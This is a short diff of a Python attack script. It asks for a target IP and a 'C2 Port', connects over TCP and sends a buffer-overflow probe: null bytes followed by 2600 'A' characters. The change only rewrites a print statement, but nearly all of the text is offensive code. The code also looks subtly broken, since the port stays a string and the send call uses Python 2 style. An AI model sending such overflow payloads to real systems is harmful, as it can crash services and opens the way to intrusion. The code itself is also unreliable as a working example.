@@ -11,7 +11,7 @@ import socket
 server_ip = input("IP: ")
 c2_port = input("C2 Port: ")
 
-print("Dropping {server_ip}").format(server_ip)
+print("Dropping %s " % server_ip)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #opens a TCP socket
 c2connection = s.connect((server_ip,c2_port))
 s.send('\x00\x00'+"A"*2600+'\r\n') #sending data
